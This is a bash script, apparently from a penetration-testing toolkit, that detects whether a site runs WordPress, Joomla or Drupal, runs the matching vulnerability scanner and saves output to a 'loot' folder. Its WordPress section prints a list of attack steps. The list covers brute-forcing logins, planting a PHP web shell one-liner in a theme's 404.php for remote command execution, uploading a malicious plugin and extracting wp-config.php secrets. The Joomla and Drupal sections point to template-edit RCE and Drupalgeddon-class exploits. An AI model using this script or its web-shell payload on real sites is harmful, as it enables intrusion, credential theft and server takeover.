#!/usr/bin/env bash
# cms-scan — fingerprint a CMS and run the right enumerator. WordPress is the common one;
# Joomla/Drupal handled if their scanners are installed. Local only.
#
# Usage:  ./cms-scan.sh <url> [label]
# Example: ./cms-scan.sh http://blog.target wp1
set -uo pipefail
URL="${1:?usage: cms-scan.sh <url> [label]}"; URL="${URL%/}"
host=$(printf '%s' "$URL" | sed -E 's#^[a-z]+://##; s#[/:?].*$##')
LABEL="${2:-$host}"; OUT="loot/$LABEL"; mkdir -p "$OUT"
have(){ command -v "$1" >/dev/null 2>&1; }

body=$(curl -sk --max-time 15 "$URL/"); hdr=$(curl -skI --max-time 15 "$URL/")
cms="unknown"
printf '%s%s' "$body" "$hdr" | grep -qiE 'wp-content|wp-includes|wordpress' && cms="wordpress"
printf '%s%s' "$body" "$hdr" | grep -qiE 'joomla|/components/com_|option=com_' && cms="joomla"
printf '%s%s' "$body" "$hdr" | grep -qiE 'drupal|sites/default|x-generator: drupal' && cms="drupal"
echo "[*] detected CMS: $cms"

case "$cms" in
  wordpress)
    echo "[*] wpscan — users, vulnerable plugins/themes, configs"
    if have wpscan; then
      wpscan --url "$URL" --disable-tls-checks --enumerate u,ap,at,cb,dbe --plugins-detection aggressive \
             -o "$OUT/wpscan.txt" ${WPSCAN_API_TOKEN:+--api-token "$WPSCAN_API_TOKEN"} 2>/dev/null
      echo "    -> $OUT/wpscan.txt"
      grep -iE 'User\(s\) Identified|\| [a-z]|known vulnerabilit|\[!\]' "$OUT/wpscan.txt" 2>/dev/null | head -30
    else echo "    wpscan not installed: sudo apt install -y wpscan"; fi
    cat <<'EOF'
[next] WordPress attack paths:
  - enumerated users + weak creds -> wp-login.php (brute with login-enum.sh / ffuf)
  - valid admin -> Appearance > Theme Editor: edit 404.php to <?php system($_GET[0]);?> -> /wp-content/themes/<t>/404.php?0=id
  - or Plugins > add a malicious plugin zip -> RCE
  - vulnerable plugin LFI/RCE from the wpscan list (confirm the version)
  - secrets: /wp-config.php (via LFI/backup), xmlrpc.php for faster cred brute
EOF
    ;;
  joomla)  have joomscan && joomscan --url "$URL" | tee "$OUT/joomscan.txt" || echo "    install: sudo apt install -y joomscan"
           echo "[next] Joomla: admin at /administrator; valid admin -> Templates > edit a .php for RCE; check com_* component CVEs.";;
  drupal)  have droopescan && droopescan scan drupal -u "$URL" | tee "$OUT/droopescan.txt" || echo "    install: pipx install droopescan"
           echo "[next] Drupal: check version for Drupalgeddon-class RCE; /user login; modules.";;
  *) echo "[*] not an obvious CMS — run normal recon (scripts/target-recon.sh $URL $LABEL).";;
esac
